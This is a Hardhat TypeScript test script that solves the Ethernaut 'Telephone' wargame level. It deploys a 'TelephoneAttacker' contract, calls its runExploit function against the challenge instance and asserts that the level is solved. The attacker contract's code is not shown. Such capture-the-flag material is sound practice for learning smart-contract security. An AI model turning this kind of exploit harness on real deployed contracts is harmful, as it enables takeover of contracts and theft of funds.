import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Telephone`);
  const challengeAddress = await createChallenge(
    `0x0b6F6CE4BCfB70525A31454292017F640C10c768`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const AttackerFactory = await ethers.getContractFactory(`TelephoneAttacker`)
  let attackerFactory = await AttackerFactory.connect(eoa).deploy()

  await attackerFactory.connect(eoa).runExploit(challenge.address)

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
